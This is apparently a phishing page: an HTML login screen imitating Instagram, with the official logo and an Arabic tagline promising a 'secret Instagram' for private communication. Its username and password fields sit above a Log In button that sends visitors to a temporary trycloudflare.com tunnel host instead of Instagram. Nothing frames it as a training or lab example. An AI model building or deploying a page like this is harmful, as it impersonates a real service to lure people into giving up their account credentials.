<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram Clone</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 300px;
            text-align: center;
            border-radius: 8px;
        }

        .logo {
            margin-bottom: 10px;
        }

        .logo img {
            width: 175px;
        }

        .description {
            color: #555;
            font-size: 14px;
            margin-bottom: 20px;
            font-weight: bold;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }

        button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #0074cc;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
            </div>
            <p class="description">للتسجيل بالنستقرام السري لتواصل بسرية تامة</p>
            <form>
                <input type="text" placeholder="Phone number, username, or email" required>
                <input type="password" placeholder="Password" required>
                <button type="button" onclick="window.location.href='https://spring-preferences-event-drive.trycloudflare.com';">Log In</button>
            </form>
        </div>
    </div>
</body>
</html>
